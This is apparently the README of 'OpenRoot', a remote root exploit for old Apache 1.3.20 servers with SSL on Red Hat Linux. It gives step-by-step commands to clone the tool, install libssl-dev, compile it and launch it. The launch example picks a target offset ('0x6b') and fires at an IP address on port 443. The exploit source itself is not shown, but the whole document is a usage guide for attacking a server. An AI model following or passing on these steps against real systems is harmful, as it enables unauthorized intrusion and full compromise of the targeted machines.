# OpenRoot
## Usage

1. Download OpenR00t.c
```
git clone https://github.com/rony926/OpenRoot.git
```
2. Install ssl-dev library

```
apt-get install libssl-dev
```

3. It's Compile Time

````
gcc -o OpenR00t OpenR00t.c -lcrypto
````

4. Running the Exploit
```
./OpenR00t
```

5. See which service you witch to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6b option
./OpenR00t 0x6b [Target Ip] [port] -c 40

for example:
```
./OpenRoot 0x6b 192.168.80.145 443 -c 40
```
